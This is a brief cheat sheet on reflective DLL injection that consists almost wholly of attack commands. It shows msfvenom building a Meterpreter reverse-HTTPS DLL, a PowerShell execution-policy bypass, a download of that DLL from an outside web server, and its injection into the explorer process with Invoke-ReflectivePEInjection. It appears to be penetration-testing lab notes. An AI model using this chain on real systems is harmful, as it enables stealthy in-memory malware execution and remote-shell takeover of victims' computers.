# Reflective DLL Injection

```
 sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.217 LPORT=443 -f dll -o /var/www/html/met.dll
```

```
PowerShell -Exec Bypass
```

```rust
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll')
```

```
$procid = (Get-Process -Name explorer).Id
```

```powershell
Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
```

```powershell
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```
